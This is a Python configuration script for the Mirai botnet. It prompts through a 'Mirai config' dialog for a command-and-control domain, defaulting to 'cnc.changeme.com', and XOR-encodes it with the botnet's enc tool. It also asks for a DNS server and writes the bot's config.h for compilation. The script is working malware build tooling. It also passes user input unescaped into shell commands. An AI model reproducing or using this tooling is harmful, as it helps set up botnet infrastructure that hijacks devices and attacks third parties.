import sys, subprocess
import re
import os
import sys


def do_enc(domain):
    result = os.popen('which ./debug/enc')

    if result.read() == '':
        print("Please compile emc")
        sys.exit(1)

    out = subprocess.Popen(["./debug/enc", "string", domain], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    stdout,stderr = out.communicate()
    xor = stdout.decode().replace("\n", " ").split(" ")[5]
    length = stdout.decode().replace("\n", " ").split(" ")[1]
    return xor, length


frontend = "dialog"
configfile = "./bot/config.h"

result = os.popen('which ' + frontend)
if result.read() == '':
    print("Please install dialog!")
    sys.exit(1)

def show_dialog(options, define_value):
    title = "Mirai config"

    if options['type'] == 'text':
        result = os.popen(frontend + ' --stdout --title "' + title + '"  --inputbox "' + options['desc'] + '" 0 0 "' + define_value + '"').readline()
        
        return result
    elif options['type'] == 'question':

        if define_value == "undef":
            default = " --defaultno"
        else:
            default = ""

        status = os.system(frontend + default + ' --title "' + title + '"  --yesno "' + options['desc'] + '" 0 0')
        if status == 0:
            return True
        else:
            return False

config = "#ifndef CONFIG_H \n#define CONFIG_H \n"


domain = show_dialog({ "type" : "text", "desc" : "Domain" }, "cnc.changeme.com")
x, l = do_enc(domain)

config += f"#define DOMAIN_NAME \"{x}\"\n"
config += f"#define DOMAIN_NAME_LEN {l}\n"

dns = show_dialog({ "type" : "text", "desc" : "DNS server" }, "8.8.8.8")
for i, s in enumerate(dns.split(".")):
    config += f"#define DNS_{i} {s}\n"


config += "#endif\n"

if show_dialog({ "type" : "question", "desc" : "Save Config" }, "undef"):
    f = open(configfile, "w")
    f.write(config)
    f.flush()
    f.close()
    print("configuration saved in " + configfile)
